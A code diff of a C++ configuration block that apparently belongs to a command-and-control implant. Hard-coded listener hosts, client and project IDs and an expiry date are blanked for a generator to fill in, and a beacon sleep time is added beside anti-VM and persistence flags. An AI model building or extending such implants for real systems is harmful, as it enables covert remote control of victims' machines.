@@ -6,30 +6,29 @@
 
 using namespace nlohmann;
 
+//VARIABLES ARE SET BY GENERATOR
+
 //net variables
-std::string host = "localhost";
-std::string port = "5150";
+std::string host = "";
+std::string port = "";
 int version = 11; //change to 20?
-//change to struct or seperate variables. should only parse incoming json
-json listener_json = json::parse(R"([
-{"host": "localhost", "port": "5150"},
-{"host": "localhost", "port": "5151"},
-{"host": "localhost", "port": "5152"}])"); //going to be a problem with the template script
+
+json listener_json = json::parse(R"()");
 
 //Vars
 //static client id
-std::string client_id = "00000000-0000-0000-0000-000000000000";//replace with generated uuid or read from persistence
+std::string client_id = "";
 //project id
-int project_id = 1;//replace
+std::string project_id = "";
 //expiration date
-std::string expiration_date = "11-11-2111"; //replace
+std::string expiration_date = "";
 //task array
 json task_array = json::array();
 //log array
 json log_array = json::array();
 //settings
 bool NO_VM = true;
-bool PERSIST_ON = false;//for testing purposes
+bool PERSIST_ON = false;
 //connection bool
 bool CONN_OK = false;
 
@@ -44,3 +43,5 @@ std::string host_name = "";
 std::string client_name = "";
 //UID
 int client_UID = 1000;
+//sleep time
+int sleep_time = 15;
